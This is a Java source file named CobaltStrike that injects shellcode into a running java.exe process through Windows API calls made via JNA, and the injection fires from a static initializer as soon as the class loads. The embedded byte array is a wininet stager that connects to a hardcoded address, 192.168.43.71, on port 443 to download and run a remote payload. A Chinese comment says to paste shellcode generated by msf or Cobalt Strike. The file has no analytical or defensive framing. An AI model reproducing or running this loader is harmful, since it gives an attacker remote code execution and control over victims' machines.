import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef.DWORD;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

public class CobaltStrike
{
    //复制粘贴通过msf或者cs生成的java shellcode，需要将0x前面添加强制转换为byte。
    static byte buf[] = new byte[] { (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8,
                    (byte) 0xc8, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41,
                    (byte) 0x50, (byte) 0x52,
                    (byte) 0x51, (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48,
                    (byte) 0x8b, (byte) 0x52, (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18,
                    (byte) 0x48, (byte) 0x8b,
                    (byte) 0x52, (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48,
                    (byte) 0x0f, (byte) 0xb7, (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9,
                    (byte) 0x48, (byte) 0x31,
                    (byte) 0xc0, (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c,
                    (byte) 0x20, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01,
                    (byte) 0xc1, (byte) 0xe2,
                    (byte) 0xed, (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                    (byte) 0x20, (byte) 0x8b, (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0,
                    (byte) 0x66, (byte) 0x81,
                    (byte) 0x78, (byte) 0x18, (byte) 0x0b, (byte) 0x02, (byte) 0x75, (byte) 0x72, (byte) 0x8b,
                    (byte) 0x80, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85,
                    (byte) 0xc0, (byte) 0x74,
                    (byte) 0x67, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48,
                    (byte) 0x18, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01,
                    (byte) 0xd0, (byte) 0xe3,
                    (byte) 0x56, (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34,
                    (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9,
                    (byte) 0x48, (byte) 0x31,
                    (byte) 0xc0, (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41,
                    (byte) 0x01, (byte) 0xc1, (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c,
                    (byte) 0x03, (byte) 0x4c,
                    (byte) 0x24, (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8,
                    (byte) 0x58, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01,
                    (byte) 0xd0, (byte) 0x66,
                    (byte) 0x41, (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40,
                    (byte) 0x1c, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04,
                    (byte) 0x88, (byte) 0x48,
                    (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e,
                    (byte) 0x59, (byte) 0x5a, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41,
                    (byte) 0x5a, (byte) 0x48,
                    (byte) 0x83, (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0,
                    (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12,
                    (byte) 0xe9, (byte) 0x4f,
                    (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x6a, (byte) 0x00, (byte) 0x49,
                    (byte) 0xbe, (byte) 0x77, (byte) 0x69, (byte) 0x6e, (byte) 0x69, (byte) 0x6e, (byte) 0x65,
                    (byte) 0x74, (byte) 0x00,
                    (byte) 0x41, (byte) 0x56, (byte) 0x49, (byte) 0x89, (byte) 0xe6, (byte) 0x4c, (byte) 0x89,
                    (byte) 0xf1, (byte) 0x41, (byte) 0xba, (byte) 0x4c, (byte) 0x77, (byte) 0x26, (byte) 0x07,
                    (byte) 0xff, (byte) 0xd5,
                    (byte) 0xe8, (byte) 0x80, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x4d, (byte) 0x6f,
                    (byte) 0x7a, (byte) 0x69, (byte) 0x6c, (byte) 0x6c, (byte) 0x61, (byte) 0x2f, (byte) 0x35,
                    (byte) 0x2e, (byte) 0x30,
                    (byte) 0x20, (byte) 0x28, (byte) 0x63, (byte) 0x6f, (byte) 0x6d, (byte) 0x70, (byte) 0x61,
                    (byte) 0x74, (byte) 0x69, (byte) 0x62, (byte) 0x6c, (byte) 0x65, (byte) 0x3b, (byte) 0x20,
                    (byte) 0x4d, (byte) 0x53,
                    (byte) 0x49, (byte) 0x45, (byte) 0x20, (byte) 0x39, (byte) 0x2e, (byte) 0x30, (byte) 0x3b,
                    (byte) 0x20, (byte) 0x57, (byte) 0x69, (byte) 0x6e, (byte) 0x64, (byte) 0x6f, (byte) 0x77,
                    (byte) 0x73, (byte) 0x20,
                    (byte) 0x4e, (byte) 0x54, (byte) 0x20, (byte) 0x36, (byte) 0x2e, (byte) 0x31, (byte) 0x3b,
                    (byte) 0x20, (byte) 0x54, (byte) 0x72, (byte) 0x69, (byte) 0x64, (byte) 0x65, (byte) 0x6e,
                    (byte) 0x74, (byte) 0x2f,
                    (byte) 0x35, (byte) 0x2e, (byte) 0x30, (byte) 0x3b, (byte) 0x20, (byte) 0x3b, (byte) 0x20,
                    (byte) 0x4e, (byte) 0x43, (byte) 0x4c, (byte) 0x49, (byte) 0x45, (byte) 0x4e, (byte) 0x54,
                    (byte) 0x35, (byte) 0x30,
                    (byte) 0x5f, (byte) 0x41, (byte) 0x41, (byte) 0x50, (byte) 0x43, (byte) 0x44, (byte) 0x41,
                    (byte) 0x35, (byte) 0x38, (byte) 0x34, (byte) 0x31, (byte) 0x45, (byte) 0x33, (byte) 0x33,
                    (byte) 0x33, (byte) 0x29,
                    (byte) 0x00, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58,
                    (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58,
                    (byte) 0x58, (byte) 0x58,
                    (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58,
                    (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58,
                    (byte) 0x58, (byte) 0x58,
                    (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x58, (byte) 0x00, (byte) 0x59, (byte) 0x48,
                    (byte) 0x31, (byte) 0xd2, (byte) 0x4d, (byte) 0x31, (byte) 0xc0, (byte) 0x4d, (byte) 0x31,
                    (byte) 0xc9, (byte) 0x41,
                    (byte) 0x50, (byte) 0x41, (byte) 0x50, (byte) 0x41, (byte) 0xba, (byte) 0x3a, (byte) 0x56,
                    (byte) 0x79, (byte) 0xa7, (byte) 0xff, (byte) 0xd5, (byte) 0xe9, (byte) 0x81, (byte) 0x00,
                    (byte) 0x00, (byte) 0x00,
                    (byte) 0x5a, (byte) 0x48, (byte) 0x89, (byte) 0xc1, (byte) 0x41, (byte) 0xb8, (byte) 0xbb,
                    (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x41,
                    (byte) 0x51, (byte) 0x41,
                    (byte) 0x51, (byte) 0x6a, (byte) 0x03, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0xba,
                    (byte) 0x57, (byte) 0x89, (byte) 0x9f, (byte) 0xc6, (byte) 0xff, (byte) 0xd5, (byte) 0xeb,
                    (byte) 0x64, (byte) 0x48,
                    (byte) 0x89, (byte) 0xc1, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x41, (byte) 0x58,
                    (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x52, (byte) 0x68, (byte) 0x00, (byte) 0x32,
                    (byte) 0xa0, (byte) 0x84,
                    (byte) 0x52, (byte) 0x52, (byte) 0x41, (byte) 0xba, (byte) 0xeb, (byte) 0x55, (byte) 0x2e,
                    (byte) 0x3b, (byte) 0xff, (byte) 0xd5, (byte) 0x48, (byte) 0x89, (byte) 0xc6, (byte) 0x6a,
                    (byte) 0x0a, (byte) 0x5f,
                    (byte) 0x48, (byte) 0x89, (byte) 0xf1, (byte) 0xba, (byte) 0x1f, (byte) 0x00, (byte) 0x00,
                    (byte) 0x00, (byte) 0x6a, (byte) 0x00, (byte) 0x68, (byte) 0x80, (byte) 0x33, (byte) 0x00,
                    (byte) 0x00, (byte) 0x49,
                    (byte) 0x89, (byte) 0xe0, (byte) 0x41, (byte) 0xb9, (byte) 0x04, (byte) 0x00, (byte) 0x00,
                    (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x75, (byte) 0x46, (byte) 0x9e, (byte) 0x86,
                    (byte) 0xff, (byte) 0xd5,
                    (byte) 0x48, (byte) 0x89, (byte) 0xf1, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x4d,
                    (byte) 0x31, (byte) 0xc0, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x52, (byte) 0x52,
                    (byte) 0x41, (byte) 0xba,
                    (byte) 0x2d, (byte) 0x06, (byte) 0x18, (byte) 0x7b, (byte) 0xff, (byte) 0xd5, (byte) 0x85,
                    (byte) 0xc0, (byte) 0x75, (byte) 0x1d, (byte) 0x48, (byte) 0xff, (byte) 0xcf, (byte) 0x74,
                    (byte) 0x10, (byte) 0xeb,
                    (byte) 0xbf, (byte) 0xeb, (byte) 0x63, (byte) 0xe8, (byte) 0x97, (byte) 0xff, (byte) 0xff,
                    (byte) 0xff, (byte) 0x2f, (byte) 0x32, (byte) 0x49, (byte) 0x73, (byte) 0x6f, (byte) 0x00,
                    (byte) 0x00, (byte) 0x41,
                    (byte) 0xbe, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2, (byte) 0x56, (byte) 0xff, (byte) 0xd5,
                    (byte) 0x48, (byte) 0x31, (byte) 0xc9, (byte) 0xba, (byte) 0x00, (byte) 0x00, (byte) 0x40,
                    (byte) 0x00, (byte) 0x41,
                    (byte) 0xb8, (byte) 0x00, (byte) 0x10, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xb9,
                    (byte) 0x40, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x58,
                    (byte) 0xa4, (byte) 0x53,
                    (byte) 0xe5, (byte) 0xff, (byte) 0xd5, (byte) 0x48, (byte) 0x93, (byte) 0x53, (byte) 0x53,
                    (byte) 0x48, (byte) 0x89, (byte) 0xe7, (byte) 0x48, (byte) 0x89, (byte) 0xf1, (byte) 0x48,
                    (byte) 0x89, (byte) 0xda,
                    (byte) 0x41, (byte) 0xb8, (byte) 0x00, (byte) 0x20, (byte) 0x00, (byte) 0x00, (byte) 0x49,
                    (byte) 0x89, (byte) 0xf9, (byte) 0x41, (byte) 0xba, (byte) 0x12, (byte) 0x96, (byte) 0x89,
                    (byte) 0xe2, (byte) 0xff,
                    (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x20, (byte) 0x85, (byte) 0xc0,
                    (byte) 0x74, (byte) 0xb6, (byte) 0x66, (byte) 0x8b, (byte) 0x07, (byte) 0x48, (byte) 0x01,
                    (byte) 0xc3, (byte) 0x85,
                    (byte) 0xc0, (byte) 0x75, (byte) 0xd7, (byte) 0x58, (byte) 0x58, (byte) 0xc3, (byte) 0xe8,
                    (byte) 0x15, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x31, (byte) 0x39, (byte) 0x32,
                    (byte) 0x2e, (byte) 0x31,
                    (byte) 0x36, (byte) 0x38, (byte) 0x2e, (byte) 0x34, (byte) 0x33, (byte) 0x2e, (byte) 0x37,
                    (byte) 0x31, (byte) 0x00 };

    static Kernel32 kernel32 = (Kernel32) Native.loadLibrary( Kernel32.class, W32APIOptions.UNICODE_OPTIONS );

    static IKernel32 iKernel32 = (IKernel32) Native.loadLibrary( "kernel32", IKernel32.class );

    // Pointer to the API's
    interface IKernel32
                    extends StdCallLibrary
    {
        boolean WriteProcessMemory( Pointer p, int address, Memory bufferToWrite, int size, IntByReference written );

        boolean ReadProcessMemory( Pointer hProcess, int inBaseAddress, Pointer outputBuffer, int nSize,
                                   IntByReference outNumberOfBytesRead );

        int VirtualQueryEx( Pointer hProcess, Pointer lpMinimumApplicationAddress, Pointer lpBuffer, int dwLength );

        Pointer OpenProcess( int desired, boolean inherit, int pid );

        int VirtualAllocEx( Pointer hProcess, Pointer lpAddress, int i,
                            int flAllocationType, int flProtect );

        void CreateRemoteThread( Pointer hOpenedProcess, Object object, int i, int baseAddress, int j, int k,
                                 Object object2 );
    }

    static
    {

        String processName = "java.exe";

        byte[] shellcode = buf;

        int shellcodeSize = shellcode.length;

        long processId = findProcessID( processName );

        // Open process
        Pointer hOpenedProcess =
                        iKernel32.OpenProcess( 0x0010 + 0x0020 + 0x0008 + 0x0400 + 0x0002, true, (int) processId );

        // Check if the desired process is 32bit
        if ( checkIfProcessIsWow64( hOpenedProcess ) )
        {
            System.exit( 0 );
        }

        // Generate Buffer to write
        IntByReference bytesWritten = new IntByReference( 0 );
        Memory bufferToWrite = new Memory( shellcodeSize );

        for ( int i = 0; i < shellcodeSize; i++ )
        {
            bufferToWrite.setByte( i, shellcode[i] );
        }

        // Allocate memory
        int baseAddress = iKernel32.VirtualAllocEx( hOpenedProcess, Pointer.createConstant( 0 ), shellcodeSize, 4096,
                                                    64 );

        // Write Buffer to memory
        iKernel32.WriteProcessMemory( hOpenedProcess, baseAddress, bufferToWrite, shellcodeSize, bytesWritten );

        // Create Thread in the victim process
        iKernel32.CreateRemoteThread( hOpenedProcess, null, 0, baseAddress, 0, 0, null );
    }

    /*
     *  Search for the desired process
     *  @param the process name we wish to inject
     *  @return the handle of the desired process
     */
    static long findProcessID( String processName )
    {
        Tlhelp32.PROCESSENTRY32.ByReference processInfo = new Tlhelp32.PROCESSENTRY32.ByReference();
        WinNT.HANDLE processSnapshotHandle =
                        kernel32.CreateToolhelp32Snapshot( Tlhelp32.TH32CS_SNAPPROCESS, new DWORD( 0L ) );

        try
        {
            kernel32.Process32First( processSnapshotHandle, processInfo );

            if ( processName.equals( Native.toString( processInfo.szExeFile ) ) )
            {
                return processInfo.th32ProcessID.longValue();
            }

            while ( kernel32.Process32Next( processSnapshotHandle, processInfo ) )
            {
                if ( processName.equals( Native.toString( processInfo.szExeFile ) ) )
                {
                    return processInfo.th32ProcessID.longValue();
                }
            }

            return 0L;

        }
        finally
        {
            kernel32.CloseHandle( processSnapshotHandle );
        }
    }

    /*
     *  Checks for the process architecture
     *  @param handle to the opened process
     *  @return if the process architecture is 64bit
     */
    private static boolean checkIfProcessIsWow64( Pointer hOpenedProcess )
    {
        IntByReference ref = new IntByReference();
        WinNT.HANDLE handleToProcess = new WinNT.HANDLE( hOpenedProcess );

        if ( !kernel32.IsWow64Process( handleToProcess, ref ) )
        {
            System.exit( 0 );
        }

        return ref.getValue() == 0;
    }
}